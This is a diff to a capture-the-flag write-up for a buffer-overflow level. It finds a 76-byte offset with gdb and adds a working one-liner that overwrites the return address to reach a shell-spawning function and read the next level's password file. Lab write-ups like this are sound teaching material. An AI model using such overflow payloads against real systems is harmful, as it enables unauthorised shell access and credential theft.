@@ -13,17 +13,12 @@ we lauch the binary in gdb and as input for gets we send
 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvxxxxyyyyzzzz
 The binary segfaults at adress 0x74747474, 0x74 in ascii is 't'
 
-Our exploit string must then have 76 random chars then the adress of the run function, in high endian
-The file exploit.py generates such a string
+Our exploit string must then have 76 random chars then the adress of the run function, in high endian:
 
-scp -P 4242 ./exploit.py level1@<ip of the VM>:/tmp/exploit.py
+(python -c "print '.' * 76 + '\x44\x84\x04\x08'" && cat) | ./level1
 
-In the vm:
-python /tmp/exploit.py > /tmp/overflow
-(cat /tmp/overlfow && cat) | ./level1
-
-As "cat" closes the stdin of the binary,
+As the first command closes the stdin of the binary,
 the opened shell opened in "run" is immediately closed
 if we don't open another one. This is done with the "&& cat" part of the line
 
-We can then cat /user/level2/.pass to get the flag
+We can then cat /home/user/level2/.pass to get the flag
